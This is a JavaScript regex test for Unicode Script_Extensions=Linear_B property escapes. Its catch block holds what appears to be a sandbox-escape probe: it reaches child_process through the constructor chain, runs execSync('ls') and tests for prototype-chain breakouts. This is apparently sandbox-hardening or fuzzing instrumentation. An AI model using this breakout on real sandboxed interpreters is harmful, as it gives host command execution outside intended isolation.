try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                65536,
                65547
            ],
            [
                65549,
                65574
            ],
            [
                65576,
                65594
            ],
            [
                65596,
                65597
            ],
            [
                65599,
                65613
            ],
            [
                65616,
                65629
            ],
            [
                65664,
                65786
            ],
            [
                65792,
                65794
            ],
            [
                65799,
                65843
            ],
            [
                65847,
                65855
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Linear_B}+$/u, matchSymbols, '\\p{Script_Extensions=Linear_B}');
    testPropertyEscapes(/^\p{Script_Extensions=Linb}+$/u, matchSymbols, '\\p{Script_Extensions=Linb}');
    testPropertyEscapes(/^\p{scx=Linear_B}+$/u, matchSymbols, '\\p{scx=Linear_B}');
    testPropertyEscapes(/^\p{scx=Linb}+$/u, matchSymbols, '\\p{scx=Linb}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            65548,
            65575,
            65595,
            65598
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                65535
            ],
            [
                65614,
                65615
            ],
            [
                65630,
                65663
            ],
            [
                65787,
                65791
            ],
            [
                65795,
                65798
            ],
            [
                65844,
                65846
            ],
            [
                65856,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Linear_B}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Linear_B}');
    testPropertyEscapes(/^\P{Script_Extensions=Linb}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Linb}');
    testPropertyEscapes(/^\P{scx=Linear_B}+$/u, nonMatchSymbols, '\\P{scx=Linear_B}');
    testPropertyEscapes(/^\P{scx=Linb}+$/u, nonMatchSymbols, '\\P{scx=Linb}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}